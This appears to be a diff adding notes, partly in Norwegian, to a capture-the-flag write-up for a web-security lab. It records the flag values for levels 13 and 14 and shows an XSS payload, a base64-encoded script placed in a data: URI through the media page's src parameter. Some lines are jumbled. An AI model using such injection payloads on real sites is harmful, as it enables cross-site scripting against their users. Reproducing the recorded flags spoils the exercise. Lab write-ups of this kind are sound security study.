@@ -253,6 +253,37 @@ Congratulations Flag13 is 6bad301f529ea136b3427e9daf2e6b2e
 ```
 http://129.241.200.165:19680/test.php
 ```
+Tror dette kan også gjøres ved xss på http://129.241.200.165:19680/index.php?page=feedback
+
 
 # Flag14
+THE FLAG 14 IS : A7DCADB231D434C43082783B0983AB74
+
+http://129.241.200.165:19680/?page=media&src=nsa
+
+```
+edit:
+	<object data="http://10.0.2.15/images/nsa_prism.jpg" echo http:></object>
+input:
+	<object echo '<script>alert("drown.png")</script>' | base64 PHNjcmlwdD5hbGVydCgiZHJvd24ucG5nIik8L3NjcmlwdD4= echo http:></object>
+
+Gå til denne siden:
+	http://129.241.200.165:19680/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiZHJvd24ucG5nIik8L3NjcmlwdD4=
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
